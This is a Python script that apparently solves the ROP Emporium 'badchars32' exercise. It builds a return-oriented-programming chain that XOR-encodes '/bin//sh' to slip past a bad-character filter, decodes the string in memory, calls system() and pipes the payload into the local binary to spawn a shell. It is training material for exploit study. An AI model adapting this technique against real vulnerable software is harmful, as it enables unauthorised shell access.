#!/usr/bin/python

import struct
import os

def p32(addr):
	return struct.pack("<I",addr)

def check_bad(chars):
	badchars = [0x62,0x69,0x63,0x2f,0x20,0x66,0x6e,0x73]
	test = bytearray(chars)
	for byte in test:
        	if byte in badchars:
                	return True
	return False

def xor(string):
	str = bytearray(string)
	result = ''
	for i in range(len(str)):
	     result += chr(str[i] ^ 0x9)
	return result


garbage = "A"*44


system = p32(0x080484e0)

#pop esi; pop edi; ret
pop_esi_pop_edi = p32(0x08048899)

#pop ebx; pop ecx; ret
pop_ebx_pop_ecx = p32(0x08048896)

#pop edi; pop ebp; ret
pop_edi_pop_ebp = p32(0x080488fa)

#xor BYTE PTR [ebx],cl
xor_ebx_cl = p32(0x08048890)

#mov DWORD PTR [edi],esi
mov_edi_esi = p32(0x08048893)

data_section = 0x0804a038

binsh = "/bin//sh"
bin = "/bin"
sh = "//sh"

print  xor(binsh)
print xor(xor(binsh))
print check_bad(xor(binsh))

exploit  = garbage
exploit += pop_esi_pop_edi
exploit += xor(bin)
exploit += p32(data_section)
exploit += mov_edi_esi

exploit += pop_esi_pop_edi
exploit += xor(sh)
exploit += p32(data_section+4)
exploit += mov_edi_esi

exploit += pop_esi_pop_edi
exploit += p32(0)
exploit += p32(data_section+8)
exploit += mov_edi_esi

for i in range(len(binsh)):
	exploit += pop_ebx_pop_ecx
	exploit += p32(data_section+i)
	exploit += p32(0x9)
	exploit += xor_ebx_cl

exploit += system
exploit += "pppp"
exploit += p32(data_section)

with open("simple_exploit.txt","w") as f:
	f.write(exploit)
	f.close()

os.system("((cat simple_exploit.txt);cat -)|./badchars32")
